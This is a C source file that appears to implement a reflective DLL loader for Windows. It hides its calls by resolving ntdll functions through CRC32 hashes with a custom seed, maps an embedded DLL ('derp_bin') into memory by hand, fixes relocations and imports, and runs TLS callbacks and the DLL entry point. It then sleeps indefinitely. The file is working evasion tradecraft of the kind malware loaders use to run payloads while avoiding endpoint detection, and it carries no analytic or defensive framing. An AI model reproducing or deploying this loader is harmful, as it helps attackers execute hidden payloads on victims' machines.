#include <Windows.h>
#include <stdint.h>
#include "dll.h"

/************************************************************************/
/*                      Structs and defines                             */
/************************************************************************/

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
	union {
		NTSTATUS Status;
		PVOID Pointer;
	} DUMMYUNIONNAME;
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _FILE_STANDARD_INFORMATION {
	LARGE_INTEGER AllocationSize;
	LARGE_INTEGER EndOfFile;
	ULONG NumberOfLinks;
	BOOLEAN DeletePending;
	BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, * PFILE_STANDARD_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileIdBothDirectoryInformation,
	FileIdFullDirectoryInformation,
	FileValidDataLengthInformation,
	FileShortNameInformation,
	FileIoCompletionNotificationInformation,
	FileIoStatusBlockRangeInformation,
	FileIoPriorityHintInformation,
	FileSfioReserveInformation,
	FileSfioVolumeInformation,
	FileHardLinkInformation,
	FileProcessIdsUsingFileInformation,
	FileNormalizedNameInformation,
	FileNetworkPhysicalNameInformation,
	FileIdGlobalTxDirectoryInformation,
	FileIsRemoteDeviceInformation,
	FileUnusedInformation,
	FileNumaNodeInformation,
	FileStandardLinkInformation,
	FileRemoteProtocolInformation,
	FileRenameInformationBypassAccessCheck,
	FileLinkInformationBypassAccessCheck,
	FileVolumeNameInformation,
	FileIdInformation,
	FileIdExtdDirectoryInformation,
	FileReplaceCompletionInformation,
	FileHardLinkFullIdInformation,
	FileIdExtdBothDirectoryInformation,
	FileDispositionInformationEx,
	FileRenameInformationEx,
	FileRenameInformationExBypassAccessCheck,
	FileDesiredStorageClassInformation,
	FileStatInformation,
	FileMaximumInformation
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

typedef struct _STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} ANSI_STRING, * PANSI_STRING;

#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define RTL_CONSTANT_STRING(s) { sizeof(s)-sizeof((s)[0]), sizeof(s), s }
#define FILL_STRING(string, buffer)       \
	string.Length = (USHORT)sl(buffer);   \
	string.MaximumLength = string.Length; \
	string.Buffer = buffer

typedef VOID(__stdcall* PIO_APC_ROUTINE)(PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG Reserved);
typedef VOID(__stdcall* RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);

typedef NTSTATUS(__stdcall* NtClose_t)(HANDLE);
typedef NTSTATUS(__stdcall* RtlMultiByteToUnicodeN_t)(PWCH UnicodeString, ULONG MaxBytesInUnicodeString, PULONG BytesInUnicodeString, PCSTR MultiByteString, ULONG BytesInMultiByteString);
typedef NTSTATUS(__stdcall* NtReadFile_t)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
typedef NTSTATUS(__stdcall* LdrLoadDll_t)(PCWSTR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID* DllHandle);
typedef NTSTATUS(__stdcall* LdrGetProcedureAddress_t)(PVOID DllHandle, PANSI_STRING ProcedureName, ULONG ProcedureNumber, PVOID* ProcedureAddress);
typedef NTSTATUS(__stdcall* NtCreateFile_t)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSTATUS(__stdcall* NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(__stdcall* NtProtectVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, DWORD NewProtect, PULONG OldProtect);
typedef NTSTATUS(__stdcall* NtFreeVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
typedef NTSTATUS(__stdcall* NtWriteVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
typedef NTSTATUS(__stdcall* NtReadVirtualMemory_t)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
typedef NTSTATUS(__stdcall* NtFlushInstructionCache_t)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
typedef NTSTATUS(__stdcall* NtQueryInformationFile_t)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
typedef NTSTATUS(__stdcall* NtDelayExecution_t)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

#define SEED 0xDEADDEAD
#define HASH(API)(crc32b((uint8_t *)API))

#define NtClose_CRC32b                      0xf78fd98f
#define NtReadFile_CRC32b                   0xab569438
#define LdrLoadDll_CRC32b                   0x43638559
#define NtCreateFile_CRC32b                 0x962c4683
#define NtFreeVirtualMemory_CRC32b          0xf29625d3
#define NtReadVirtualMemory_CRC32b          0x58bdb7be
#define RtlInitUnicodeString_CRC32b         0xe17f353f
#define NtWriteVirtualMemory_CRC32b         0xcf14127c
#define NtQueryInformationFile_CRC32b       0xb54956cb
#define NtProtectVirtualMemory_CRC32b       0x357d60b3
#define LdrGetProcedureAddress_CRC32b       0x3b93e684
#define RtlMultiByteToUnicodeN_CRC32b       0xaba11095
#define NtAllocateVirtualMemory_CRC32b      0xec50426f
#define NtFlushInstructionCache_CRC32b      0xc5f7ca5e
#define NtDelayExecution_CRC32b				710014335

extern void* get_ntdll();

void* get_proc_address_by_hash(void* dll_address, uint32_t function_hash);

/************************************************************************/
/*                         Main function                                */
/************************************************************************/

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040L
#endif

#ifndef FILE_OPEN_IF
#define FILE_OPEN_IF 0x00000003
#endif

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES ); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}
#endif

// ml64.exe /c peb.masm /Fo peb.obj

uint32_t crc32b(const uint8_t* str) {
	uint32_t crc = 0xFFFFFFFF;
	uint32_t byte;
	uint32_t mask;
	int i = 0x0;
	int j;

	while (str[i] != 0) {
		byte = str[i];
		crc = crc ^ byte;
		for (j = 7; j >= 0; j--) {
			mask = -1 * (crc & 1);
			crc = (crc >> 1) ^ (SEED & mask);
		}
		i++;
	}
	return ~crc;
}

void* get_proc_address_by_hash(void* dll_address, uint32_t function_hash) {
	void* base = dll_address;
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
	PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	unsigned long* p_address_of_functions = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfFunctions);
	unsigned long* p_address_of_names = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfNames);
	unsigned short* p_address_of_name_ordinals = (PWORD)((DWORD_PTR)base + export_directory->AddressOfNameOrdinals);

	for (unsigned long i = 0; i < export_directory->NumberOfNames; i++) {
		LPCSTR p_function_name = (LPCSTR)((DWORD_PTR)base + p_address_of_names[i]);
		unsigned short p_function_ordinal = (unsigned short)p_address_of_name_ordinals[i];
		unsigned long p_function_address = (unsigned long)p_address_of_functions[p_function_ordinal];

		if (function_hash == HASH(p_function_name))
			return (void*)((DWORD_PTR)base + p_function_address);
	}
	return NULL;
}

void *mc(void* dest, const void* src, size_t n){
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (n--)
        *d++ = *s++;
    return dest;
}

size_t sl(const char* str) {
    size_t len = 0;
    while (*str++)
        len++;
    return len;
}

#define FILL_STRING(string, buffer) \
	string.Length = (USHORT)sl(buffer); \
	string.MaximumLength = string.Length; \
	string.Buffer = buffer

typedef BOOL (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);

int start() {

    NTSTATUS status;

    void *dll_bytes = derp_bin;
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
    SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;

    void *dll_base = NULL;
    void *p_ntdll = get_ntdll();
    void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
    NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;
    if((status = g_nt_allocate_virtual_memory((HANDLE) -1, &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
        return -4;

    unsigned long long int delta_image_base = (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
    mc(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for(size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        void *section_destination = (LPVOID)((unsigned long long int)dll_base + (unsigned long long int)section->VirtualAddress);
        void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes + (unsigned long long int)section->PointerToRawData);
        mc(section_destination, section_bytes, section->SizeOfRawData);
        section++;
    }

    IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
    unsigned long relocations_processed = 0;

    while(relocations_processed < relocations.Size) {
        PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
        relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
        unsigned long relocations_count = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);

        for(unsigned long i = 0; i < relocations_count; i++) {
            relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
            if(relocation_entries[i].Type == 0)
                continue;

            unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
            unsigned long long int address_to_patch = 0;
            void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
            NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;
            if((status = g_nt_read_virtual_memory(((HANDLE) -1), (void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                return -5;

            address_to_patch += delta_image_base;
            mc((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int));
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
    IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    UNICODE_STRING import_library_name;

    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (unsigned long long int)dll_base);
    void *current_library = NULL;

    while(import_descriptor->Name != 0) {
        void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
        char *module_name = (char *)dll_base + import_descriptor->Name;
        wchar_t w_module_name[MAX_PATH];
        unsigned long num_converted;

        void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
        RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;
        if((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name, sl(module_name) +1)) != 0x0)
            return -5;

        void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
        RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
        g_rtl_init_unicode_string(&import_library_name, w_module_name);
        LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;
        if((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
            return -6;

        if (current_library){
            ANSI_STRING a_string;
            PIMAGE_THUNK_DATA thunk = NULL;
            PIMAGE_THUNK_DATA original_thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
            original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->OriginalFirstThunk);
            while (thunk->u1.AddressOfData != 0){
                void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    g_ldr_get_procedure_address(current_library, NULL, (WORD) original_thunk->u1.Ordinal, (PVOID *) &(thunk->u1.Function));
                } else {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base + thunk->u1.AddressOfData);
                    FILL_STRING(a_string, functionName->Name);
                    g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *) &(thunk->u1.Function));
                }
                ++thunk;
                ++original_thunk;
            }
        }
        import_descriptor++;
    }

    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
        if (section_header->SizeOfRawData) {
            unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
            unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            unsigned long protect = 0;

            if (!executable && !readable && !writeable)
                protect = PAGE_NOACCESS;
            else if (!executable && !readable && writeable)
                protect = PAGE_WRITECOPY;
            else if (!executable && readable && !writeable)
                protect = PAGE_READONLY;
            else if (!executable && readable && writeable)
                protect = PAGE_READWRITE;
            else if (executable && !readable && !writeable)
                protect = PAGE_EXECUTE;
            else if (executable && !readable && writeable)
                protect = PAGE_EXECUTE_WRITECOPY;
            else if (executable && readable && !writeable)
                protect = PAGE_EXECUTE_READ;
            else if (executable && readable && writeable)
                protect = PAGE_EXECUTE_READWRITE;

            if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                protect |= PAGE_NOCACHE;

            size_t size = section_header->SizeOfRawData;
            void *address = (char*)dll_base + section_header->VirtualAddress;

            void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
            NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
            if((status = g_nt_protect_virtual_memory(((HANDLE) -1), &address, &size, protect, &protect)) != 0x0)
                return -7;
        }
    }

    void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
    NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;
    g_nt_flush_instruction_cache((HANDLE) -1, NULL, 0);

    PIMAGE_TLS_CALLBACK *callback;
    PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if(tls_entry->Size) {
        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
        callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
        for(; *callback; callback++)
            (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
    }

    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
    NtDelayExecution_t sleep = (NtDelayExecution_t)get_proc_address_by_hash(p_ntdll, NtDelayExecution_CRC32b);
	LARGE_INTEGER interval;
	interval.QuadPart = -31556952000000000LL;
	while (1) sleep(FALSE, &interval);

    void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
    NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
    g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_image_size, MEM_RELEASE);

    return 0;
}